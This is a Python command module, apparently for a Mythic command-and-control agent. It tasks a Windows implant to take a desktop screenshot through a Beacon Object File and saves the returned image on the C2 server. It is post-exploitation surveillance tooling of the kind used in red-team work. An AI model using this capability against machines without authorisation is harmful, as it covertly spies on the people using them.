import base64
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from .bof_utils import bof_tasking


class ScreenshotArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot"
    description = "Capture a screenshot of the desktop (BOF)"
    version = 1
    author = "@peter.tamas"
    argument_class = ScreenshotArguments
    attackmapping = ["T1113"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        dependencies=["execute_coff"],
    )

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        return await bof_tasking(task, "nx_screenshot.x64.o", binary_output=True)

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        if response:
            try:
                image_data = base64.b64decode(response)
                file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                    TaskID=task.Task.ID,
                    FileContents=image_data,
                    Filename=f"screenshot_{task.Task.ID}.bmp",
                    DeleteAfterFetch=False,
                    IsScreenshot=True,
                    IsDownloadFromAgent=True,
                ))
                if file_resp.Success:
                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                        TaskID=task.Task.ID,
                        Response=f"Screenshot saved ({len(image_data)} bytes)",
                    ))
            except Exception as e:
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=f"Screenshot processing failed: {str(e)}",
                ))
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
